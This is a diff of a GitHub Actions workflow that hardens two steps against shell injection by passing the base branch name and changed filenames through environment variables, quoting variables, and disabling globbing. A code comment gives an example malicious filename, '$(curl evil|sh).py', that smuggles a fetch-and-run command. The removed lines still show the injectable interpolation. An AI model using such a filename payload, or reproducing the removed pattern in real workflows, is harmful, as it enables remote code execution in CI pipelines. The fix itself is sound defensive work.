@@ -44,18 +44,36 @@ jobs:
 
       - name: Get changed files
         id: changed
+        # Pass github.base_ref via env, never interpolated into the run: body.
+        # The Actions templating engine substitutes ${{ }} into the script text
+        # BEFORE bash runs it, so an untrusted value placed directly in run:
+        # would be executed as shell. Reading it from an env var is a plain
+        # variable expansion (no command substitution), which is injection-safe.
+        env:
+          BASE_REF: ${{ github.base_ref }}
         run: |
-          FILES=$(git diff --name-only origin/${{ github.base_ref }}...HEAD \
+          FILES=$(git diff --name-only "origin/${BASE_REF}...HEAD" \
             -- '*.py' '*.js' '*.ts' '*.jsx' '*.tsx' | tr '\n' ' ')
-          COUNT=$(echo $FILES | wc -w | tr -d ' ')
-          echo "files=$FILES" >> $GITHUB_OUTPUT
-          echo "count=$COUNT" >> $GITHUB_OUTPUT
+          COUNT=$(echo "$FILES" | wc -w | tr -d ' ')
+          echo "files=$FILES" >> "$GITHUB_OUTPUT"
+          echo "count=$COUNT" >> "$GITHUB_OUTPUT"
 
       - name: Run complexity analysis
         if: steps.changed.outputs.count > 0
+        # CHANGED_FILES is PR-controlled (filenames from the diff). Pass it via
+        # env, not interpolated into run:, so a filename like '$(curl evil|sh).py'
+        # cannot inject shell. Variable expansion does not evaluate command
+        # substitution in the value.
+        env:
+          CHANGED_FILES: ${{ steps.changed.outputs.files }}
         run: |
+          # Intentional unquoted word-split of the space-separated list into
+          # separate --changed-files args. This is safe: the value comes from an
+          # env var (no command substitution); disable globbing so a filename
+          # with shell metacharacters cannot expand.
+          set -f
           python .github/scripts/complexity_analysis.py \
-            --changed-files ${{ steps.changed.outputs.files }} \
+            --changed-files $CHANGED_FILES \
             --baseline-dir .baseline \
             --output-md /tmp/complexity_comment.md
 
